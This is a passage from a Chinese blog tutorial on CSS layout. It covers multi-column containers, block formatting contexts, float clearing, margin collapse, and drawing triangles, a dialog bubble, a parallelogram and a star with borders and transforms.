不为auto，设置为1也算多列容器】</p><blockquote><p>多列容器不是网格里的多列，而是一个我之前从来没有用过的属性，利用 <code>column-count</code> 可以轻松得将一个div分成三列，非常适和文字很长得情况下进行分列。</p></blockquote><div style="column-count: 3; background-color: bisque; color: black">    在过去的几年里，CSS 经历了一场巨变，正如 JavaScript 在 2004 年前后所经历的那场革命。它从一门极度简单、功能有限的样式语言，发展成为一项由 80 多项 W3C 规范（含草案）所定义的复杂技术，并建立起了独有的开发者生态圈、专属的技术会议、专用的框架和工具链。CSS 已经如此壮大，以致于一个普通人已经无法把它完整地装进自己的头脑了。甚至在W3C 专门定义这门语言的工作组中，也没人敢说自己是精通 CSS 所有方面的专家，甚至连接近这个程度都非常困难。实际上，大多数工作组成员只专注 CSS 的某个特定细节，可能对其他部分知之甚少。</div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;column-count: 3; background-color: bisque; color: black&quot;</span>&gt;</span><br>    在过去的几年里，CSS 经历了一场巨变，正如 JavaScript 在 2004 年前后所经历的那场革命。它从一门极度简单、功能有限的样式语言，发展成为一项由 80 多项 W3C 规范（含草案）所定义的复杂技术，并建立起了独有的开发者生态圈、专属的技术会议、专用的框架和工具链。CSS 已经如此壮大，以致于一个普通人已经无法把它完整地装进自己的头脑了。甚至在W3C 专门定义这门语言的工作组中，也没人敢说自己是精通 CSS 所有方面的专家，甚至连接近这个程度都非常困难。实际上，大多数工作组成员只专注 CSS 的某个特定细节，可能对其他部分知之甚少。<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p><code>column-count</code>会根据被分配到的宽度自动设置每列的宽度，列数是确定的。<code>column-width</code>则会保证每列的宽度，所以具体的列数会改变。</p></blockquote><div style="column-width: 100px; background-color: lightcyan; color: black">    大约在 2009 年之前，评判一个人的 CSS 专业程度并不是看他对这门语言的了解有多深。对当时的 CSS 行业来说，这或多或少就是现实：一个人能否称得上 CSS 高手，往往要看他能记住多少个浏览器 bug 和相应的对策。一转眼就到了 2015 年，现在的浏览器都是以 Web 标准作为设计基准的，过去那些针对特定浏览器的脆弱 hack 早已风光不再。当然，某些不兼容的情况仍然无法避免，但是迭代速度已经非常之快（尤其是因为现在的浏览器几乎都已经实现自动更新了），把这些不兼容的情况记录在书中完全是在浪费时间和空间。</div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;column-width: 100px; background-color: lightcyan; color: black&quot;</span>&gt;</span><br>    大约在 2009 年之前，评判一个人的 CSS 专业程度并不是看他对这门语言的了解有多深。对当时的 CSS 行业来说，这或多或少就是现实：一个人能否称得上 CSS 高手，往往要看他能记住多少个浏览器 bug 和相应的对策。一转眼就到了 2015 年，现在的浏览器都是以 Web 标准作为设计基准的，过去那些针对特定浏览器的脆弱 hack 早已风光不再。当然，某些不兼容的情况仍然无法避免，但是迭代速度已经非常之快（尤其是因为现在的浏览器几乎都已经实现自动更新了），把这些不兼容的情况记录在书中完全是在浪费时间和空间。<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>column-span: all 的元素将始终创建一个新的BFC，即使该元素没有包裹在一个多列元素之中。</p><blockquote><p><code>column-span:all</code> 会在父元素设置列数，比如<code>column-count: 3</code>的时候横跨三行。</p></blockquote><div style="column-count: 3; background-color: seashell">    <h3 style="column-span: all; color: black">我们在现代 CSS 中所面临的挑战已经不在于如何绕过这些转瞬即逝的浏览器 bug。</h3>    <p style="color: black">如今的挑战是，在保证 DRY1①、可维护、灵活性、轻量级并且尽可能符合标准的前提下，把我们手中的这些 CSS 特性转化为网页中的各种创意。这正是这本书将要呈现的内容。DRY 是 Don’t Repeat Yourself 的首字母缩写，意思是不应该重复你已经做过的事。它是一种广为流传的编程理念，旨在提升代码某方面的可维护性：在改变某个参数时，做到只改尽量少的地方，最好是一处。强调 CSS 代码的 DRY 原则是一个贯穿本书的主题。DRY 的反面是 WET，它的意思是 We Enjoy Typing（我们喜欢敲键盘）或 Write Everything Twice（同样的代码写两次）。</p></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;column-count: 3; background-color: seashell&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;column-span: all; color: black&quot;</span>&gt;</span>我们在现代 CSS 中所面临的挑战已经不在于如何绕过这些转瞬即逝的浏览器 bug。<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: black&quot;</span>&gt;</span>如今的挑战是，在保证 DRY1①、可维护、灵活性、轻量级并且尽可能符合标准的前提下，把我们手中的这些 CSS 特性转化为网页中的各种创意。这正是这本书将要呈现的内容。DRY 是 Don’t Repeat Yourself 的首字母缩写，意思是不应该重复你已经做过的事。它是一种广为流传的编程理念，旨在提升代码某方面的可维护性：在改变某个参数时，做到只改尽量少的地方，最好是一处。强调 CSS 代码的 DRY 原则是一个贯穿本书的主题。DRY 的反面是 WET，它的意思是 We Enjoy Typing（我们喜欢敲键盘）或 Write Everything Twice（同样的代码写两次）。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="11bfc渲染规则"><a class="markdownIt-Anchor" href="#11bfc渲染规则"></a> 11.BFC渲染规则</h2><ol><li><p>BFC中元素垂直方向上的margin会重叠。</p></li><li><p>BFC是一个独立的元素，外面的元素不会影响到里面，里面的元素也不会影响到外面</p></li><li><p>BFC内元素不会与浮动元素发生重叠</p></li><li><p>计算BFC高度的时候浮动元素也会参与计算 【解决父元素高度塌陷问题】</p></li></ol><h2 id="12-bfc应用场景"><a class="markdownIt-Anchor" href="#12-bfc应用场景"></a> 12. BFC应用场景</h2><ol><li><p>清除浮动，防止父元素高度塌陷。</p><p>如果父元素没有设置高度，而子元素设设置了高度，正常情况下子元素会把父元素撑起来。</p> <div style="width: 100%; border: 5px dotted palevioletred">     <div style="height: 32px; width: 100%; background-color: dodgerblue; text-align: center; line-height: 32px; color: white">正常子元素会把父元素撑起来</div> </div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100%; border: 5px dotted palevioletred&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;height: 32px; width: 100%; background-color: dodgerblue; text-align: center; line-height: 32px; color: white&quot;</span>&gt;</span>正常子元素会把父元素撑起来<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如果子元素设置了浮动，由于脱离了正常流的原因，父元素就不会得到它的高度，使父元素高度为0，俗称父元素高度塌陷。</p> <div style="width: 100%; border: 5px dotted palevioletred">     <div style="float: left; height: 32px; width: 100%; background-color: dodgerblue; text-align: center; line-height: 32px; color: white">子元素设置float后父元素高度塌陷</div> </div> <div style="height: 0px; clear: both"></div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100%; border: 5px dotted palevioletred&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float: left; height: 32px; width: 100%; background-color: dodgerblue; text-align: center; line-height: 32px; color: white&quot;</span>&gt;</span>子元素设置float后父元素高度塌陷<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这个时候我们只要在父元素上按照触发BFC的规则，得到一个BFC后，在BFC内部因为会计算浮动元素的高度，即可解决父元素高度塌陷的问题。</p><p>我们可以根据<a href="#10-bfc触发条件" class="tocbot-link node-name--H2 ">10. BFC触发条件</a>里的条件创建BFC，当然大部分都会有副作用，比如把父元素也设置为浮动，或者把父元素绝对定位等等，都不太实用。常用的<code>overflow: hidden</code>实际上也有副作用，你会看不到溢出的子元素。经过研究，我发现了两个没有副作用的方法。</p><p>第一种是使用<code>display: flow-root</code>。它被设计的目的大概就是为了创建BFC。</p> <div style="display: flow-root; width: 100%; border: 5px dotted palevioletred">     <div style="float: left; height: 32px; width: 100%; background-color: dodgerblue; text-align: center; line-height: 32px; color: white">父元素设置display: flow-root创建BFC</div> </div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display: flow-root; width: 100%; border: 5px dotted palevioletred&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float: left; height: 32px; width: 100%; background-color: dodgerblue; text-align: center; line-height: 32px; color: white&quot;</span>&gt;</span>父元素设置display: flow-root创建BFC<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>第二种是使用<code>column-span: all</code>。这个属性的是在多原意是在多列容器中横跨所有的列。如果我们的项目里没有使用多列容器，我们给div上创建这个属性，也会创建一个BFC，而且由于我们没有使用多列容器，所以没有任何副作用。</p><blockquote><p>column-span: all 的元素将始终创建一个新的BFC，即使该元素没有包裹在一个多列元素之中。</p></blockquote> <div style="column-span: all; width: 100%; border: 5px dotted palevioletred">     <div style="float: left; height: 32px; width: 100%; background-color: dodgerblue; text-align: center; line-height: 32px; color: white">父元素设置column-span: all创建BFC</div> </div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;column-span: all; width: 100%; border: 5px dotted palevioletred&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float: left; height: 32px; width: 100%; background-color: dodgerblue; text-align: center; line-height: 32px; color: white&quot;</span>&gt;</span>父元素设置column-span: all创建BFC<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>避免外边距折叠</p><p>目前我的观点是这样的，如果两个元素，它们是上下分布的，那么就会产生外边距折叠。这包括BFC内部的元素，因为BFC只保证内部和外部之间互补干扰，至于内部之间的各种相互作用它就管不着了。所以我们可以看到下面的例子，外层div触发了BFC，但是内部的三个div之间的margin仍然被折叠了，按理说div1和div2之间的外边距应该等于 10 + 10 = 20px的，但是实际上只有10px。</p> <div style="display: flow-root; width: 100%; background-color: green">     <div style="margin: 10px 0; height: 32px; line-height: 32px; text-align: center; background-color: lightblue; color: black">1</div>     <div style="margin: 10px 0; height: 32px; line-height: 32px; text-align: center; background-color: lightblue; color: black">2</div>     <div style="margin: 10px 0; height: 32px; line-height: 32px; text-align: center; background-color: lightblue; color: black">3</div> </div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display: flow-root; width: 100%; background-color: green&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin: 10px 0; height: 32px; line-height: 32px; text-align: center; background-color: lightblue; color: black&quot;</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin: 10px 0; height: 32px; line-height: 32px; text-align: center; background-color: lightblue; color: black&quot;</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin: 10px 0; height: 32px; line-height: 32px; text-align: center; background-color: lightblue; color: black&quot;</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>但是我们可以很容易想到一个想法，我们把这些内部元素也用一个BFC包裹，这样它们之间就互不干扰了！外边距自然也就不会折叠了！</p> <div style="display: flow-root; width: 100%; background-color: green">     <div style="display: flow-root">         <div style="margin: 10px 0; height: 32px; line-height: 32px; text-align: center; background-color: lightblue; color: black">1</div>     </div>     <div style="display: flow-root">         <div style="margin: 10px 0; height: 32px; line-height: 32px; text-align: center; background-color: lightblue; color: black">2</div>     </div>     <div style="display: flow-root">         <div style="margin: 10px 0; height: 32px; line-height: 32px; text-align: center; background-color: lightblue; color: black">3</div>     </div> </div><p>我们在里层的div分别包裹在三个BFC中，可以看到它和div1与div3的外边距没有合并，总外边距变成了10 + 10 = 20px。</p></li></ol><h2 id="13-画一个三角形"><a class="markdownIt-Anchor" href="#13-画一个三角形"></a> 13. 画一个三角形</h2><p>在这里我们先学习一下<code>border</code>的妙用。</p><div style="width: 100%; display: flex; justify-content: center">    <div style="box-sizing: content-box; width: 200px; height: 200px; border: 50px solid; border-color: crimson limegreen darkgray darkblue; background-color: violet; line-height: 200px; text-align: center; color: white"></div></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100%; display: flex; justify-content: center&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;box-sizing: content-box; width: 200px; height: 200px; border: 50px solid; border-color: crimson limegreen darkgray darkblue; background-color: violet; line-height: 200px; text-align: center; color: white&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>我平常使用border都是类似这样<code>border: 5px solid red</code>，它的结果就是盒子外面加一层5px的红色实心边框。但是实际上border四周的颜色是可以改变的，就比如上面的例子，利用<code>border-color</code>分别设置了上右下左的边框颜色，而且我们注意到一个特点，就是上下左右边框的划分。</p><p>它们首先是把盒子四周都扩大50px，这样就得到了一个更大的正方形。然后把大正方形和里面的content-box的四个顶点连起来，从而区分上下左右的边框。</p><p>那我们就想，如果把里面content-box缩小一点呢？</p><div style="width: 100%; display: flex; justify-content: center">    <div style="box-sizing: content-box; width: 100px; height: 100px; border: 50px solid; border-color: crimson limegreen darkgray darkblue; background-color: violet; line-height: 100px; text-align: center; color: white">100px</div></div><p>更小一点</p><div style="width: 100%; display: flex; justify-content: center">    <div style="box-sizing: content-box; width: 50px; height: 50px; border: 50px solid; border-color: crimson limegreen darkgray darkblue; background-color: violet; line-height: 50px; text-align: center; color: white">50px</div></div><p>如果里层的content-box的宽和高都是0呢？</p><div style="width: 100%; display: flex; justify-content: center">    <div style="box-sizing: content-box; width: 0px; height: 0px; border: 50px solid; border-color: crimson limegreen darkgray darkblue; background-color: violet; line-height: 50px; text-align: center; color: white"></div></div><p>令人兴奋的事情发生了，我们获得了四个三角形！它的出现原理和之前说的一样，都是两个矩形之间的顶点相连，只不过在content-box的宽和高都是零的情况下，大正方形的四个顶点将同时指向中心，最终实现了四个三角形的效果。</p><p>如果我们只想要四个三角中的一个，我们可以把其他三个颜色设置为透明<code>transparant</code>。</p><div style="width: 100%; display: flex; justify-content: space-around">    <div style="width: 0px; height: 0px; border: 50px solid; border-color: crimson transparent transparent transparent; line-height: 50px; text-align: center; color: white"></div>    <div style="width: 0px; height: 0px; border: 50px solid; border-color: transparent limegreen transparent transparent; line-height: 50px; text-align: center; color: white"></div>    <div style="width: 0px; height: 0px; border: 50px solid; border-color: transparent transparent darkgray transparent; line-height: 50px; text-align: center; color: white"></div>    <div style="width: 0px; height: 0px; border: 50px solid; border-color: transparent transparent transparent darkblue; line-height: 50px; text-align: center; color: white"></div></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100%; display: flex; justify-content: space-around&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 0px; height: 0px; border: 50px solid; border-color: crimson transparent transparent transparent; line-height: 50px; text-align: center; color: white&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 0px; height: 0px; border: 50px solid; border-color: transparent limegreen transparent transparent; line-height: 50px; text-align: center; color: white&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 0px; height: 0px; border: 50px solid; border-color: transparent transparent darkgray transparent; line-height: 50px; text-align: center; color: white&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 0px; height: 0px; border: 50px solid; border-color: transparent transparent transparent darkblue; line-height: 50px; text-align: center; color: white&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>有了制作三角形的技术，我们可以画一个可爱的对话框。</p><style>    .dialog {        width: 300px;        height: 32px;        background-color: cornflowerblue;        position: relative;        display: flex;        justify-content: center;        align-items: center;        color: white;    }    .dialog::before {        content: "";        display: block;        width: 0;        height: 0;        border: 8px solid;        position: absolute;        top: 8px;        left: -16px;        border-color: transparent cornflowerblue transparent transparent;    }</style><div style="display: flex; justify-content: center">    <div class="dialog">祝你每天都开心！ ——wuuconix</div></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-class">.dialog</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">height</span>: <span class="hljs-number">32px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">background-color</span>: cornflowerblue;</span><br><span class="language-css">        <span class="hljs-attribute">position</span>: relative;</span><br><span class="language-css">        <span class="hljs-attribute">display</span>: flex;</span><br><span class="language-css">        <span class="hljs-attribute">justify-content</span>: center;</span><br><span class="language-css">        <span class="hljs-attribute">align-items</span>: center;</span><br><span class="language-css">        <span class="hljs-attribute">color</span>: white;</span><br><span class="language-css">    &#125;</span><br><span class="language-css">    <span class="hljs-selector-class">.dialog</span><span class="hljs-selector-pseudo">::before</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="language-css">        <span class="hljs-attribute">display</span>: block;</span><br><span class="language-css">        <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;</span><br><span class="language-css">        <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;</span><br><span class="language-css">        <span class="hljs-attribute">border</span>: <span class="hljs-number">8px</span> solid;</span><br><span class="language-css">        <span class="hljs-attribute">position</span>: absolute;</span><br><span class="language-css">        <span class="hljs-attribute">top</span>: <span class="hljs-number">8px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">left</span>: -<span class="hljs-number">16px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">border-color</span>: transparent cornflowerblue transparent transparent;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display: flex; justify-content: center&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dialog&quot;</span>&gt;</span>祝你每天都开心！ ——wuuconix<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>只需要在div里绘制一个三角形就可以啦，这里选用了before伪元素，因为这种属于视觉层面的东西尽可能不要去影响dom，而应该使用CSS解决。</p><h2 id="14-画一个平行四边形"><a class="markdownIt-Anchor" href="#14-画一个平行四边形"></a> 14. 画一个平行四边形</h2><p>我们都知道平行四边形可以由一个矩阵变形而来，而CSS中transform中的<code>skew</code>函数可以实现类似变形的操作。</p><div style="display: flex; justify-content: center">    <div style="transform: skew(-20deg, 0); width: 200px; height: 200px; background-color: cornflowerblue"></div></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display: flex; justify-content: center&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;transform: skew(-20deg, 0); width: 200px; height: 200px; background-color: cornflowerblue&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>现在我们来记忆一下正负的变形情况，因为skew的第一个参数表示沿横坐标扭曲元素的角度。</p><p>我目前是这样记忆的，当度数属于 [0deg, 90deg]，矩形往左侧倾斜，度数的是 左侧的边与 垂直线之间的角度。</p><p>当度数属于 [-90deg, 0deg]的时候，矩形往右侧倾斜，度数的绝对值同样为 左侧的边与 垂直线之间的角度。</p><blockquote><p>值得注意的是 <code>transform: skew(-20deg, 0)</code>可以由<code>transform: skewX(-20deg)</code>代替。</p></blockquote><h2 id="15-画一个五角星"><a class="markdownIt-Anchor" href="#15-画一个五角星"></a> 15. 画一个五角星</h2><p>要画五角星，我们需要先来看看五角星的特点。</p><p><img src="https://gss0.baidu.com/-vo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/37d12f2eb9389b50ca9927588835e5dde7116e52.jpg" alt="star" /></p><p>可以看到五角星内部实际上有一个正五边形。众所周知，五边形的内角和是540度。所以正五边形的每个角度是108度。由于五边形的每个角实际上都对应了一个等腰三角形，所以我们也可以求出来等腰三角形的两个等角是36度。</p><p>所以我们如果要画五角星，首先需要得到一个顶角为108度的等腰三角形。然后仔细思考一个，不同角度下的3个这种等腰三角形，就能得到一个五角星。</p><p>我们可能无法精确画出36度的等腰三角形，也许我们可以取一个近似值？记得么，<code>3 4 5</code>那个直角三角形的最小的角是<code>36.8度</code>，我们可以根据它来画出最基本的等腰三角形。</p><div style="width: 100%; display: flex; justify-content: center">    <div style="width: 0px; height: 0px; box-sizing: content-box; border-width: 60px 80px; border-style: solid; border-color: transparent transparent violet transparent"></div></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100%; display: flex; justify-content: center&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 0px; height: 0px; box-sizing: content-box; border-width: 60px 80px; border-style: solid; border-color: transparent transparent violet transparent&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这便是近似的36度的等腰三角形了。剩下的工作便是把它复制3份，然后旋转到相应得位置。</p><div style="width: 100%; display: flex; justify-content: center">    <div style="transform: rotate(-37deg); width: 0px; height: 0px; box-sizing: content-box; border-width: 60px 80px; border-style: solid; border-color: transparent transparent violet transparent; margin-bottom: 40px"></div></div><p>我们逆时针旋转36度，就得到了和之前图片里一样得粉色三角形。我们现在需要画出另外两个三角形。</p><style>    .star {        transform: rotate(-37deg);        width: 0px;        height: 0px;        box-sizing: content-box;        border-width: 60px 80px;        border-style: solid;        border-color: transparent transparent violet transparent;        margin-bottom: 40px;        position: relative;    }    .star::before {        position: absolute;        left: -40px;        top: -30px;        transform: rotate(74deg);        content: "";        display: block;        width: 0;        height: 0;        box-sizing: content-box;        border-width: 60px 80px;        border-style: solid;        border-color: transparent transparent red transparent;    }</style><div style="width: 100%; display: flex; justify-content: center">    <div class="star"></div></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-class">.star</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">37deg</span>);</span><br><span class="language-css">        <span class="hljs-attribute">width</span>: <span class="hljs-number">0px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">height</span>: <span class="hljs-number">0px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">box-sizing</span>: content-box;</span><br><span class="language-css">        <span class="hljs-attribute">border-width</span>: <span class="hljs-number">60px</span> <span class="hljs-number">80px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">border-style</span>: solid;</span><br><span class="language-css">        <span class="hljs-attribute">border-color</span>: transparent transparent violet transparent;</span><br><span class="language-css">        <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">40px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">position</span>: relative;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-class">.star</span><span 